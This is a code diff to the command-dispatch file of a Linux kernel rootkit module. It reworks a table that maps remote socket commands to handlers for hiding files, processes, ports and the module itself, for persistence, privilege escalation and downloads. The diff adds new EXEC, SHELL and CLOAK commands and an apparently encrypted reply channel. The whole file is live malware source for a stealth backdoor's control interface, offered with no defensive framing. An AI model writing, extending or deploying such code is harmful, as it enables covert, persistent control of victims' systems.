@@ -1,105 +1,85 @@
 // SPDX-License-Identifier: GPL-2.0
-//
-// Command dispatch: table-driven with function pointers.
-//
+// execution/dispatch.c - Function pointer dispatch table for commands.
 #include <linux/string.h>
-
 #include "rootkit.h"
 
-typedef int (*rk_handler_t)(struct socket *, const char *);
-
-struct rk_cmd_entry {
+struct rk_dispatch_entry {
 	const char	*prefix;
+	size_t		prefix_len;
 	rk_handler_t	handler;
-	bool		exact;
 };
 
-static int wrap_ping(struct socket *c, const char *a)
-{
-	return RK_REPLY(c, "PONG\n");
-}
-
-static int wrap_info(struct socket *c, const char *a)       { return rk_cmd_info(c); }
-static int wrap_status(struct socket *c, const char *a)     { return rk_cmd_status(c); }
-static int wrap_unhide_all(struct socket *c, const char *a) { return rk_cmd_unhide_all(c); }
-static int wrap_hide_mod(struct socket *c, const char *a)   { return rk_cmd_hide_module(c); }
-static int wrap_unhide_mod(struct socket *c, const char *a) { return rk_cmd_unhide_module(c); }
-static int wrap_persist(struct socket *c, const char *a)    { return rk_cmd_persist(c); }
-static int wrap_unpersist(struct socket *c, const char *a)  { return rk_cmd_unpersist(c); }
-static int wrap_escalate(struct socket *c, const char *a)   { return rk_cmd_escalate(c); }
-
-static int wrap_hide_file(struct socket *c, const char *a)
-{
-	return rk_cmd_hide_target(c, hidden_files, &file_count, a);
-}
-
-static int wrap_hide_pid(struct socket *c, const char *a)
-{
-	return rk_cmd_hide_target(c, hidden_pids, &pid_count, a);
-}
-
-static int wrap_hide_content(struct socket *c, const char *a)
-{
-	return rk_cmd_hide_target(c, hidden_contents, &content_count, a);
-}
-
-static int wrap_unhide_file(struct socket *c, const char *a)
-{
-	return rk_cmd_unhide_target(c, hidden_files, &file_count, a);
-}
-
-static int wrap_unhide_pid(struct socket *c, const char *a)
-{
-	return rk_cmd_unhide_target(c, hidden_pids, &pid_count, a);
-}
-
-static int wrap_unhide_content(struct socket *c, const char *a)
-{
-	return rk_cmd_unhide_target(c, hidden_contents, &content_count, a);
-}
-
-static const struct rk_cmd_entry cmd_table[] = {
-	{ "PING",             wrap_ping,            true  },
-	{ "INFO",             wrap_info,            true  },
-	{ "STATUS",           wrap_status,          true  },
-	{ "UNHIDE ALL",       wrap_unhide_all,      true  },
-	{ "HIDE MODULE",      wrap_hide_mod,        true  },
-	{ "UNHIDE MODULE",    wrap_unhide_mod,      true  },
-	{ "PERSIST",          wrap_persist,          true  },
-	{ "UNPERSIST",        wrap_unpersist,        true  },
-	{ "ESCALATE",         wrap_escalate,         true  },
-	{ "HIDE FILE ",       wrap_hide_file,        false },
-	{ "HIDE PID ",        wrap_hide_pid,         false },
-	{ "HIDE CONTENT ",    wrap_hide_content,     false },
-	{ "HIDE PORT ",       rk_cmd_hide_port,      false },
-	{ "UNHIDE FILE ",     wrap_unhide_file,      false },
-	{ "UNHIDE PID ",      wrap_unhide_pid,       false },
-	{ "UNHIDE CONTENT ",  wrap_unhide_content,   false },
-	{ "UNHIDE PORT ",     rk_cmd_unhide_port,    false },
-	{ "LIST ",            rk_cmd_list,           false },
-	{ "DOWNLOAD ",        rk_cmd_download,       false },
+// Longer prefixes first so greedy match works correctly.
+static const struct rk_dispatch_entry dispatch_table[] = {
+	{ "UNHIDE CONTENT ", 15, cmd_unhide_content },
+	{ "HIDE CONTENT ",   13, cmd_hide_content   },
+	{ "UNHIDE FILE ",    12, cmd_unhide_file    },
+	{ "UNHIDE PORT ",    12, cmd_unhide_port    },
+	{ "UNHIDE PID ",     11, cmd_unhide_pid     },
+	{ "HIDE FILE ",      10, cmd_hide_file      },
+	{ "HIDE PORT ",      10, cmd_hide_port      },
+	{ "HIDE PID ",        9, cmd_hide_pid       },
+	{ "DOWNLOAD ",        9, cmd_download       },
+	{ "EXEC ",            5, cmd_exec           },
+	{ "LIST ",            5, cmd_list           },
+	{ "UNPERSIST",        9, cmd_unpersist      },
+	{ "UNCLOAK",          7, cmd_uncloak        },
+	{ "ESCALATE",         8, cmd_escalate       },
+	{ "PERSIST",          7, cmd_persist        },
+	{ "STATUS",           6, cmd_status         },
+	{ "SHELL",            5, cmd_shell          },
+	{ "CLOAK",            5, cmd_cloak          },
+	{ "PING",             4, cmd_ping           },
+	{ "INFO",             4, cmd_info           },
 };
 
-int rk_dispatch(struct socket *client, char *cmd)
+static size_t strip_trailing(const u8 *buf, size_t len)
 {
-	size_t len, plen;
-	int i;
+	while (len > 0 && (buf[len - 1] == '\n' || buf[len - 1] == '\r' ||
+			   buf[len - 1] == ' '))
+		len--;
+	return len;
+}
 
-	len = strlen(cmd);
-	if (len > 0 && cmd[len - 1] == '\n')
-		cmd[--len] = '\0';
+int rk_send_response(struct rk_session *s, const char *resp)
+{
+	return rk_send_sealed(s, (const u8 *)resp, strlen(resp));
+}
 
-	for (i = 0; i < ARRAY_SIZE(cmd_table); i++) {
-		const struct rk_cmd_entry *e = &cmd_table[i];
+int rk_dispatch(struct rk_session *s, const u8 *buf, size_t len)
+{
+	size_t i;
 
-		plen = strlen(e->prefix);
-		if (e->exact) {
-			if (strcmp(cmd, e->prefix) == 0)
-				return e->handler(client, NULL);
-		} else if (strncmp(cmd, e->prefix, plen) == 0) {
-			return e->handler(client, cmd + plen);
+	len = strip_trailing(buf, len);
+	if (!len)
+		return rk_send_response(s, "ERR empty command");
+
+	for (i = 0; i < ARRAY_SIZE(dispatch_table); i++) {
+		const struct rk_dispatch_entry *e = &dispatch_table[i];
+
+		if (len < e->prefix_len)
+			continue;
+		if (memcmp(buf, e->prefix, e->prefix_len) != 0)
+			continue;
+
+		// Commands with trailing space in prefix take an argument.
+		// Commands without trailing space must match exactly.
+		if (e->prefix[e->prefix_len - 1] == ' ') {
+			// Has argument: everything after prefix
+			char arg[RK_ARG_MAX];
+			size_t arg_len = len - e->prefix_len;
+
+			if (arg_len >= RK_ARG_MAX)
+				arg_len = RK_ARG_MAX - 1;
+			memcpy(arg, buf + e->prefix_len, arg_len);
+			arg[arg_len] = '\0';
+			return e->handler(s, arg);
 		}
+
+		// Exact match required
+		if (len == e->prefix_len)
+			return e->handler(s, NULL);
 	}
 
-	return RK_REPLY(client, "unknown command\n");
+	return rk_send_response(s, "ERR unknown command");
 }
